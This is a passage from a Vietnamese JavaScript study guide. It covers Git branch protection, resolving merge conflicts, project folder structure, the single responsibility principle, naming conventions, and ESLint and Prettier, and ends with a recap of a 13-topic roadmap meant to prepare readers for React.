  - `git pull`: Bằng `git fetch` + `git merge`. Lấy thư về và đổ ập ngay vào file hiện tại. Có nguy cơ phát sinh xung đột nếu bạn đang sửa dở.
- **Tại sao cấm tiệt code và push thẳng lên `main` / `master`?**
  - Nhánh `main` là nhánh đại diện cho sản phẩm thật đang phục vụ hàng triệu người dùng thực tế (**Production**).
  - Push thẳng lên `main` bỏ qua khâu kiểm duyệt, một lỗi nhỏ sẽ làm sập toàn bộ hệ thống của công ty! Nhánh `main` luôn bị khóa (Protected Branch), chỉ cho phép nạp code thông qua Pull Request có sự phê duyệt của Tech Lead.

---

### 2. Xử lý conflict cơ bản khi merge / pull:
- **Nguyên nhân phát sinh Conflict (Xung đột mã nguồn):**
  - Xảy ra khi 2 lập trình viên cùng sửa vào **cùng một dòng code** (hoặc các dòng liền kề) trong cùng 1 file, và một người đã đẩy code lên trước. Khi người thứ 2 kéo code về hoặc merge nhánh, Git không thể tự ý quyết định lấy code của ai nên dừng lại và giao quyền phán quyết cho con người.
- **Cấu trúc 3 ký hiệu phân cách chiến sự của Git:**
  ```javascript
  <<<<<<< HEAD
  // Đoạn mã do chính BẠN viết trên máy cá nhân
  const API_URL = "https://phimapi.com/v1";
  =======
  // Đoạn mã do ĐỒNG NGHIỆP đẩy lên server trước đó
  const API_URL = "https://phimapi.com/v2";
  >>>>>>> develop
  ```
  - `<<<<<<< HEAD`: Bắt đầu vùng code của bạn.
  - `=======`: Vạch ranh giới ngăn cách 2 phe.
  - `>>>>>>> <nhanh>`: Kết thúc vùng code của đồng nghiệp từ remote về.
- **Quy trình 4 bước gỡ Conflict chuẩn chỉnh:**
  1. *Thảo luận & Chọn lựa:* Ngồi lại cùng đồng nghiệp xem lấy bản nào (Accept Current Change, Accept Incoming Change, hoặc kết hợp logic của cả hai).
  2. *Dọn sạch rác Git:* **BẮT BUỘC xóa bỏ hoàn toàn tất cả các dòng ký tự `<<<<<<<`, `=======`, `>>>>>>>`**.
  3. *Kiểm thử:* Chạy thử ứng dụng trên máy để đảm bảo code không bị lỗi cú pháp hoặc hỏng luồng chạy.
  4. *Đóng gói hoàn tất:* Gõ `git add .` -> `git commit -m "fix: resolve merge conflict"` -> `git push`. Nút Merge trên GitHub sẽ tự động sáng xanh trở lại.

---

### 3. Tư duy tổ chức thư mục dự án sạch sẽ:
- Một dự án chuyên nghiệp luôn phân tách các tầng trách nhiệm thành các thư mục rõ ràng:
  - **`api/` (hoặc `services/`):** Nơi duy nhất được phép giao tiếp với máy chủ (`fetch`, Axios). Tập trung các hàm gọi mạng (`getMovieList()`, `login()`). Giúp khi máy chủ đổi URL ta chỉ cần vào 1 nơi duy nhất để sửa.
  - **`utils/` (hoặc `helpers/`):** Chứa các hàm tiện ích thuần túy (Pure Functions), độc lập hoàn toàn với giao diện: `formatVND(tien)`, `formatDate(ngay)`, `debounce(fn, delay)`.
  - **`constants/`:** Nơi lưu trữ các giá trị bất biến, biến môi trường: `CONFIG`, `STORAGE_KEYS = { TOKEN: 'token' }`, mã trạng thái. Tiệt trừ triệt để việc viết bừa bãi các chuỗi cứng ("Magic Strings") khắp dự án.
  - **`validation/`:** Chứa các biểu thức Regex và hàm kiểm định dữ liệu form (`validateEmail()`, `validatePassword()`).
  - **`components/`:** Chứa các khối giao diện tái sử dụng nhiều nơi (Navbar, Footer, MovieCard, Spinner).

---

### 4. Nguyên tắc Single Responsibility (Nguyên tắc Đơn nhiệm - SRP):
- **Định nghĩa cốt lõi:** *"Mỗi hàm hoặc mỗi module chỉ nên có duy nhất MỘT lý do để thay đổi (Chỉ làm đúng một việc và làm thật tốt)"*.
- **Hiện trường vụ án phản mẫu (Anti-pattern - "Hàm quái vật"):**
  - Viết một hàm `handleForm()` dài 200 dòng: vừa đọc dữ liệu input, vừa kiểm tra regex email, vừa format chuỗi, vừa gọi API, vừa cập nhật giao diện DOM, vừa hiện alert!
  - *Hậu quả:* Chỉ cần đổi màu thông báo hay đổi tên trường API là hàm bị vỡ nát, cực kỳ khó đọc và không thể viết Unit Test được.
- **Tái cấu trúc chuẩn Senior:**
  - Hàm `validateForm()`: Chỉ làm nhiệm vụ kiểm tra dữ liệu và trả về lỗi.
  - Hàm `authService.login()`: Chỉ làm nhiệm vụ gửi request lên Server.
  - Hàm `renderErrorUI()`: Chỉ làm nhiệm vụ hiển thị chữ đỏ lên màn hình.

---

### 5. Đặt tên biến và hàm rõ nghĩa, chuẩn quy ước camelCase / UPPER_CASE:
- **1. Quy ước lạc đà (`camelCase`):**
  - Dành cho: Biến thông thường, thuộc tính của Object, và tên Hàm.
  - *Ví dụ:* `movieTitle`, `currentUser`, `fetchMovieDetail()`, `calculateTotalPrice()`.
- **2. Quy ước chữ hoa gạch dưới (`UPPER_SNAKE_CASE`):**
  - Dành cho: Hằng số cố định toàn cục, cấu hình hệ thống không bao giờ thay đổi suốt vòng đời ứng dụng.
  - *Ví dụ:* `API_BASE_URL`, `DEFAULT_PAGE_SIZE`, `MAX_RETRY_COUNT`, `JWT_SECRET_KEY`.
- **3. Quy ước viết hoa chữ đầu (`PascalCase`):**
  - Dành cho: Tên Class, Constructor Function, và **toàn bộ tên React Components** sau này (`MovieCard`, `HeroBanner`, `LoginForm`).
- **Nghệ thuật đặt tên có ý nghĩa (Meaningful Naming):**
  - Tên hàm hành động luôn bắt đầu bằng **Động từ**: `get...`, `fetch...`, `handle...`, `render...`, `check...`.
  - Biến Boolean luôn bắt đầu bằng tiền tố khẳng định: `is...`, `has...`, `should...` (`isLoading`, `hasError`, `isWatched`, `shouldUpdate`).
  - Cấm tiệt việc đặt tên biến 1 ký tự cẩu thả (`a`, `b`, `temp`, `data1`) khiến đồng nghiệp đọc không hiểu biến đó chứa cái gì.

---

### 6. Sử dụng công cụ format code tự động: ESLint và Prettier:
- **Phân biệt hai "vệ sĩ" bảo vệ mã nguồn:**
  - **ESLint (Cảnh sát kiểm tra chất lượng và logic mã nguồn):**
    - Soi và bắt các lỗi tiềm ẩn: Khai báo biến mà không dùng (Dead code), truy cập biến chưa định nghĩa, dùng so sánh lỏng `==` thay vì `===`, quên `return` trong hàm map.
  - **Prettier (Thợ trang điểm định dạng thẩm mỹ):**
    - Không quan tâm code đúng hay sai logic. Nó chỉ quan tâm hình thức: Tự động thụt lề 2 dấu cách, tự thêm dấu chấm phẩy `;`, tự ngắt dòng khi quá 80 ký tự, chuyển đổi đồng nhất dấu nháy đơn hay kép.
- **Tính năng "Save là đẹp" (Format on Save):**
  - Cài đặt extension Prettier trong VS Code và bật `editor.formatOnSave: true`.
  - Mỗi lần bạn bấm phím `Cmd + S` (hoặc `Ctrl + S`), Prettier sẽ tự động căn chỉnh toàn bộ file code thẳng hàng tăm tắp trong tích tắc. Đảm bảo cả một đội ngũ 20 lập trình viên đều viết ra những dòng code có quy chuẩn trình bày giống hệt nhau như một người viết!

---
---

## 🏆 TỔNG KẾT TOÀN DIỆN LỘ TRÌNH 13 CHUYÊN ĐỀ JAVASCRIPT NỀN TẢNG (READY FOR REACT)

Trải qua một hành trình bền bỉ, chúng ta đã đúc kết và lấp sạch toàn bộ lỗ hổng qua **13 Chuyên đề cốt lõi**:
1. **Biến, kiểu dữ liệu và toán tử:** Ô nhớ Primitive vs Reference, cơ chế ép kiểu ngầm, `===` vs `Object.is()`.
2. **Điều kiện và vòng lặp:** Falsy values, Short-circuit `&&` / `||`, Nullish Coalescing `??`.
3. **Function:** Function Declaration vs Expression, Hoisting, Arrow Function (Lexical `this`), Closure, Default parameters.
4. **Array:** Đột biến vs Bất biến, bộ ba huyền thoại `.map()`, `.filter()`, `.reduce()`, kỹ thuật Shallow copy vs Deep copy.
5. **Object và immutable:** Pass-by-reference, cơ chế sao chép nông, kỹ thuật đóng băng `Object.freeze()`.
6. **Cú pháp ES6+:** Destructuring, Spread / Rest, Template Literals, Enhanced Object Literals, Optional Chaining `?.`.
7. **DOM và sự kiện:** Cây DOM, Event Bubbling / Capturing, Event Delegation, bẫy Memory Leak.
8. **Bất đồng bộ:** Call Stack, Web APIs, Event Loop, Microtask vs Macrotask, Promise, `async / await`, `AbortController`.
9. **Cơ chế JavaScript ngầm:** Scope & Scope Chain, Hoisting & TDZ, Closure ứng dụng trong React `useState`.
10. **Xử lý lỗi và debug:** `throw new Error()` vs `throw "string"`, V8 Stack Trace, `try...catch...finally`, Breakpoint DevTools, phân biệt 3 loại lỗi.
11. **Form và validation:** `e.preventDefault()`, `new FormData()`, bẫy XSS với `.textContent`, chống Double-submit, `form.reset()`.
12. **Kiến thức trình duyệt và API:** HTTP Methods (`PUT` vs `PATCH`), JSON serialization, Status Codes (401 vs 403), JWT & Token Rotation, CORS, `URL.createObjectURL()`.
13. **Git và cấu trúc code:** Feature branch workflow, giải quyết Conflict, Single Responsibility, ESLint & Prettier.

👉 **BẠN ĐÃ CHÍNH THỨC SỞ HỮU NỀN TẢNG JAVASCRIPT VỮNG VÀNG 100% ĐỂ BƯỚC VÀO THẾ GIỚI REACT MÀ KHÔNG HỀ CÒN BẤT KỲ ĐIỂM MÙ NÀO!**










